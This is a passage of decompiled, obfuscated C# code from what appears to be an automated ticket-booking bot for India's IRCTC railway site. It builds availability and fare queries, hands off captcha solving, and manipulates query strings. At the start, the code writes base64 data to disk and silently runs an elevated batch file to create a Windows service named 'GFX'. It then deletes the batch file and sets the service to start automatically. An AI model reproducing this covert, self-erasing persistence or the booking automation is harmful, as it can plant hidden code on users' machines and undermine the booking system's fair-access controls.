			File.WriteAllText(text4 + text5, base64EncodedData);
			string name = "GFX";
			ServiceController serviceController = new ServiceController(name);
			if (ServiceController.GetServices().FirstOrDefault(delegate(ServiceController s)
			{
				string serviceName = s.ServiceName;
				string text6 = "GFX";
				return serviceName == text6;
			}) == null)
			{
				Process process = new Process();
				ProcessStartInfo startInfo = process.StartInfo;
				string text7 = ptth0;
				string text8 = "\\Start.bat";
				startInfo.FileName = text7 + text8;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.UseShellExecute = false;
				ProcessStartInfo startInfo2 = process.StartInfo;
				string verb = "runas";
				startInfo2.Verb = verb;
				process.Start();
				while (ServiceController.GetServices().FirstOrDefault(delegate(ServiceController s)
				{
					string serviceName2 = s.ServiceName;
					string text9 = "GFX";
					return serviceName2 == text9;
				}) == null)
				{
					Thread.Sleep(100);
				}
				string text10 = ptth0;
				string text11 = "\\Start.bat";
				File.Delete(text10 + text11);
				serviceController.Start();
				Process process2 = new Process();
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				string fileName = "cmd.exe";
				processStartInfo.FileName = fileName;
				ProcessStartInfo startInfo3 = process2.StartInfo;
				string verb2 = "runas";
				startInfo3.Verb = verb2;
				process2.StartInfo.CreateNoWindow = true;
				process2.StartInfo.UseShellExecute = false;
				string arguments = "/c sc config GFX start=auto";
				processStartInfo.Arguments = arguments;
				process2.StartInfo = processStartInfo;
				process2.Start();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	internal static string GetLocalTime()
	{
		DateTime now = DateTime.Now;
		string text = "ddd MMM dd yyyy HHmmss \"GMT\"zzz";
		string name = "en-US";
		string text2 = now.ToString(text, CultureInfo.CreateSpecificCulture(name));
		string oldValue = ",";
		string text3 = text2.Replace(oldValue, "");
		string oldValue2 = ":";
		string text4 = text3.Replace(oldValue2, "");
		string oldValue3 = "+";
		return text4.Replace(oldValue3, "");
	}

	internal string ReadAllText(UpdateTStatus updTStatus)
	{
		string text = "";
		try
		{
			string text2 = "StartLodingCaptcha";
			string key = text2;
			if (updTStatus != null)
			{
				string status = "StartLodingCaptcha";
				updTStatus(1018, status, "");
			}
			while (!clsMain.dictionary_5.ContainsKey(key))
			{
				Application.DoEvents();
				Thread.Sleep(50);
			}
			text = clsMain.dictionary_5[key];
			clsMain.dictionary_5.Remove(text);
		}
		catch
		{
		}
		return text;
	}

	internal void GetStationList()
	{
		throw new NotImplementedException();
	}

	internal string method_34(ref string requestUrl, bool isAPP, int PairID, bool previusDay)
	{
		if (previusDay)
		{
			dateTime_X = dateTime_0.AddDays(-1.0);
		}
		else
		{
			dateTime_X = dateTime_0;
		}
		requestUrl = "https://www.contents.irctc.co.in/eticketing/protected/mapps1/avlFarenquiry/" + TRAIN_NO + "/" + dateTime_X.ToString("yyyyMMdd") + "/" + SRC_STN + "/" + DEST_STN + "/" + TKT_CLASS + "/" + TKT_QUOTA + "/N";
		return "{\"masterId\":null,\"wsUserLogin\":null,\"wsUserPassword\":null,\"wsUserTransactionPassword\":null,\"addMealDetail\":null,\"addWPServiceCharge\":false,\"agentDeviceId\":null,\"agentOtpBooking\":false,\"applyLimitCheck\":false,\"atasOpted\":null,\"autoUpgradationSelected\":false,\"bankId\":0,\"boardingStation\":null,\"bookNowPressTimeDiff\":0,\"bookingInitTime\":0,\"bookingOTP\":null,\"captcha\":null,\"captureAddress\":0,\"choiceIgnored\":false,\"clientTransactionId\":null,\"clusterFlag\":\"N\",\"clusterJourneyClass\":null,\"coachId\":null,\"cod\":\"false\",\"concessionBooking\":false,\"connectedPnrDataDTO\":null,\"connectingJourney\":false,\"covid19\":false,\"enquiryType\":\"3\",\"enrouteStation\":null,\"extraActivity\":null,\"freeCanFeesFlag\":null,\"ftBooking\":false,\"generalPsgn\":false,\"generalistChildConfirm\":false,\"gnToCkOpted\":false,\"gstDetails\":null,\"hrmsTxnId\":0,\"iTicketDetailsDTO\":null,\"ignoreChoiceIfWl\":true,\"infantList\":null,\"loyaltyAccrualBookingFlag\":false,\"loyaltyNo\":0,\"loyaltyRedemptionBooking\":false,\"mainJourneyPnr\":null,\"mainJourneyTktId\":null,\"mainJourneyTxnId\":null,\"mobileNumber\":null,\"moreThanOneDay\":true,\"mpBooking\":false,\"mpPsgnPresent\":false,\"mpSecType\":null,\"multiLapBooking\":false,\"name\":null,\"nget_transaction_id\":0,\"nosbBooking\":false,\"onwardFlag\":\"N\",\"otpBooking\":false,\"passengerList\":null,\"paymentType\":1,\"reservationChoice\":null,\"reservationMode\":\"WS_TA_B2C\",\"reservationUptoStation\":null,\"returnJourney\":false,\"rlyPassBooking\":false,\"ssQuotaSplitCoach\":null,\"ticketChoiceLowerBerth\":null,\"ticketChoiceSameCoach\":false,\"ticketConcessionType\":0,\"ticketType\":null,\"tktAddress\":null,\"trainOwner\":null,\"travelInsuranceOpted\":null,\"travelProtectFlag\":null,\"twoPhaseAuthRequired\":false,\"viaPointStation\":null,\"warrentType\":null,\"zeroServiceCharge\":false}";
	}

	internal string AvailablityPost(ref string requestUrl, bool isAPP, int PairID, bool previusDay)
	{
		if (previusDay)
		{
			dateTime_X = dateTime_0.AddDays(-1.0);
		}
		else
		{
			dateTime_X = dateTime_0;
		}
		string text = "https://www.irctc.co.in/eticketing/protected/mapps1/allLapAvlEnq";
		requestUrl = text;
		string[] array = new string[13];
		string text2 = "https://www.irctc.co.in/eticketing/protected/mapps1/avlFarenquiry/";
		array[0] = text2;
		array[1] = TRAIN_NO;
		string text3 = "/";
		array[2] = text3;
		ref DateTime reference = ref dateTime_X;
		string text4 = "yyyMMdd";
		array[3] = reference.ToString(text4);
		string text5 = "/";
		array[4] = text5;
		array[5] = SRC_STN;
		string text6 = "/";
		array[6] = text6;
		array[7] = DEST_STN;
		string text7 = "/";
		array[8] = text7;
		array[9] = TKT_CLASS;
		string text8 = "/";
		array[10] = text8;
		array[11] = TKT_QUOTA;
		string text9 = "/N";
		array[12] = text9;
		requestUrl = string.Concat(array);
		if (!isAPP)
		{
			string[] array2 = new string[13];
			string text10 = "{\"paymentFlag\":\"N\",\"concessionBooking\":false,\"ftBooking\":false,\"loyaltyRedemptionBooking\":false,\"ticketType\":\"E\",\"quotaCode\":\"";
			array2[0] = text10;
			array2[1] = TKT_QUOTA;
			string text11 = "\",\"moreThanOneDay\":true,\"returnJourney\":false,\"trainNumber\":\"";
			array2[2] = text11;
			array2[3] = TRAIN_NO;
			string text12 = "\",\"fromStnCode\":\"";
			array2[4] = text12;
			array2[5] = SRC_STN;
			string text13 = "\",\"toStnCode\":\"";
			array2[6] = text13;
			array2[7] = DEST_STN;
			string text14 = "\",\"isLogedinReq\":true,\"journeyDate\":\"";
			array2[8] = text14;
			ref DateTime reference2 = ref dateTime_X;
			string text15 = "yyyMMdd";
			array2[9] = reference2.ToString(text15);
			string text16 = "\",\"classCode\":\"";
			array2[10] = text16;
			array2[11] = TKT_CLASS;
			string text17 = "\"}";
			array2[12] = text17;
			string.Concat(array2);
			string[] array3 = new string[13];
			string text18 = "{\"paymentFlag\":\"N\",\"concessionBooking\":false,\"ftBooking\":false,\"loyaltyRedemptionBooking\":false,\"ticketType\":\"E\",\"quotaCode\":\"";
			array3[0] = text18;
			array3[1] = TKT_QUOTA;
			string text19 = "\",\"moreThanOneDay\":true,\"returnJourney\":false,\"trainNumber\":\"";
			array3[2] = text19;
			array3[3] = TRAIN_NO;
			string text20 = "\",\"fromStnCode\":\"";
			array3[4] = text20;
			array3[5] = SRC_STN;
			string text21 = "\",\"toStnCode\":\"";
			array3[6] = text21;
			array3[7] = DEST_STN;
			string text22 = "\",\"isLogedinReq\":true,\"journeyDate\":\"";
			array3[8] = text22;
			ref DateTime reference3 = ref dateTime_X;
			string text23 = "yyyMMdd";
			array3[9] = reference3.ToString(text23);
			string text24 = "\",\"classCode\":\"";
			array3[10] = text24;
			array3[11] = TKT_CLASS;
			string text25 = "\"}";
			array3[12] = text25;
			string.Concat(array3);
			string[] array4 = new string[13];
			string text26 = "{\"paymentFlag\":\"N\",\"concessionBooking\":false,\"ftBooking\":false,\"loyaltyRedemptionBooking\":false,\"ticketType\":\"E\",\"quotaCode\":\"";
			array4[0] = text26;
			array4[1] = TKT_QUOTA;
			string text27 = "\",\"moreThanOneDay\":true,\"returnJourney\":false,\"trainNumber\":\"";
			array4[2] = text27;
			array4[3] = TRAIN_NO;
			string text28 = "\",\"fromStnCode\":\"";
			array4[4] = text28;
			array4[5] = SRC_STN;
			string text29 = "\",\"toStnCode\":\"";
			array4[6] = text29;
			array4[7] = DEST_STN;
			string text30 = "\",\"isLogedinReq\":true,\"journeyDate\":\"";
			array4[8] = text30;
			ref DateTime reference4 = ref dateTime_X;
			string text31 = "yyyMMdd";
			array4[9] = reference4.ToString(text31);
			string text32 = "\",\"classCode\":\"";
			array4[10] = text32;
			array4[11] = TKT_CLASS;
			string text33 = "\"}";
			array4[12] = text33;
			return string.Concat(array4);
		}
		string[] array5 = new string[15];
		string text34 = "{\"gnToCkOpted\":false,\"clusterFlag\":\"N\",\"connectingJourney\":false,\"moreThanOneDay\":true,\"bookNowPressTimeDiff\":0,\"tktAddress\":{\"addressFlag\":0,\"validRegdAddress\":false,\"stateName\":\"\",\"phoneExt\":0,\"postOffice\":\"\",\"address\":\"\",\"pinCode\":0,\"colony\":\"\",\"phoneNumber\":0,\"street\":\"\",\"city\":\"\",\"country\":\"\"},\"loyaltyRedemptionBooking\":false,\"reservationMode\":\"WS_TA_B2C\",\"bookingConfirmChoice\":0,\"wsUserLogin\":\"\",\"ftBooking\":false,\"generalistChildConfirm\":false,\"bookingInitTime\":0,\"bookingChoice\":0,\"alternateAvlInputDTO\":[{\"srcStn\":\"";
		array5[0] = text34;
		array5[1] = SRC_STN;
		string text35 = "\",\"reasonType\":\"\",\"returnTicket\":false,\"concessionPassengers\":false,\"jrnyDate\":\"";
		array5[2] = text35;
		ref DateTime reference5 = ref dateTime_X;
		string text36 = "yyyMMdd";
		array5[3] = reference5.ToString(text36);
		string text37 = "\",\"trainNo\":\"";
		array5[4] = text37;
		array5[5] = TRAIN_NO;
		string text38 = "\",\"jrnyClass\":\"";
		array5[6] = text38;
		array5[7] = TKT_CLASS;
		string text39 = "\",\"loyaltyBooking\":false,\"concessionBooking\":false,\"jpFlag\":false,\"avlClasses\":[\"";
		array5[8] = text39;
		array5[9] = TKT_CLASS;
		string text40 = "\"],\"destStn\":\"";
		array5[10] = text40;
		array5[11] = DEST_STN;
		string text41 = "\",\"ftBooking\":false,\"quotaCode\":\"";
		array5[12] = text41;
		array5[13] = TKT_QUOTA;
		string text42 = "\"}],\"paymentType\":1,\"cod\":\"false\",\"autoUpgradationSelected\":false,\"onwardFlag\":\"N\"}";
		array5[14] = text42;
		return string.Concat(array5);
	}

	internal bool GetPreviusDayStatus(string response)
	{
		bool result = false;
		try
		{
			DateTime dateTime = DateTime.Now.AddDays(-1.0);
			string text = "ddd";
			string text2 = dateTime.ToString(text);
			string text3 = "running";
			string @string = GetString(response, text3 + text2);
			string text4 = "Y";
			if (@string == text4)
			{
				result = true;
			}
		}
		catch (Exception)
		{
		}
		return result;
	}

	public static string smethod_14(string string_158, string string_159, string string_160)
	{
		int num = 40314018;
		num = (new int[4] { 830, 761, 985, 961 })[1];
		string text = "";
		string text2 = "";
		string text3 = "";
		bool flag = false;
		try
		{
			if (string_158.IndexOf(string_159) == 0)
			{
				string text4 = string_158;
				string text5 = "=";
				string oldValue = string_159 + text5;
				string text6 = "=";
				return text4.Replace(oldValue, string_159 + text6 + string_160);
			}
			string text7 = string_158;
			string text8 = string_158;
			string text9 = "&";
			string text10 = "=";
			text = text7.Substring(0, text8.IndexOf(text9 + string_159 + text10) + 1);
			string text22;
			string text25;
			if (!(text == ""))
			{
				string text11 = string_158;
				string text12 = string_158;
				string text13 = "&";
				string text14 = "=";
				text2 = text11.Substring(text12.IndexOf(text13 + string_159 + text14) + 1);
				try
				{
					string text15 = text2;
					string text16 = text2;
					string value = "&";
					text3 = text15.Substring(0, text16.IndexOf(value));
				}
				catch
				{
					flag = true;
					if ((0x2F8 ^ num) != 0 && (0x2F9 ^ num) == 0)
					{
						text3 = text2;
					}
				}
				string text17 = text3;
				string text18 = text3;
				string value2 = "=";
				string text19 = text17.Substring(text18.IndexOf(value2) + 1);
				string text20 = text3;
				string text21 = text3;
				string value3 = "=";
				text22 = text20.Substring(0, text21.IndexOf(value3));
				string text23 = text2;
				string text24 = text2;
				string value4 = "&";
				text25 = text23.Substring(text24.IndexOf(value4) + 1);
				if (string_160 == null)
				{
					goto IL_02d6;
				}
				string right = "del";
				if (Operators.CompareString(string_160, right, TextCompare: true) == 0)
				{
					string_158 = text + text25;
				}
				else
				{
					string right2 = "blnk";
					if (Operators.CompareString(string_160, right2, TextCompare: true) != 0)
					{
						string right3 = "intt";
						if (Operators.CompareString(string_160, right3, TextCompare: true) != 0)
						{
							goto IL_02d6;
						}
						if (Operators.CompareString(text19, "", TextCompare: true) != 0)
						{
							string[] array = new string[6] { text, text22, null, null, null, null };
							string text26 = "=";
							array[2] = text26;
							array[3] = ((int)Convert.ToUInt32(text19)).ToString();
							string text27 = "&";
							array[4] = text27;
							array[5] = text25;
							string_158 = string.Concat(array);
						}
					}
					else
					{
						string text28 = text;
						string text29 = "=&";
						string_158 = text28 + text22 + text29 + text25;
					}
				}
				goto IL_0345;
			}
			string[] array2 = new string[5] { string_158, null, null, null, null };
			string text30 = "&";
			array2[1] = text30;
			array2[2] = string_159;
			string text31 = "=";
			array2[3] = text31;
			array2[4] = string_160;
			return string.Concat(array2);
			IL_02d6:
			string text34;
			if (!flag)
			{
				string[] array3 = new string[6] { text, text22, null, null, null, null };
				string text32 = "=";
				array3[2] = text32;
				array3[3] = string_160;
				string text33 = "&";
				array3[4] = text33;
				array3[5] = text25;
				text34 = string.Concat(array3);
			}
			else
			{
				string text35 = text;
				string text36 = "=";
				text34 = text35 + text22 + text36 + string_160;
			}
			string_158 = text34;
			goto IL_0345;
			IL_0345:
			return string_158;
		}
		catch (Exception)
		{
			return string_158;
		}
	}
}
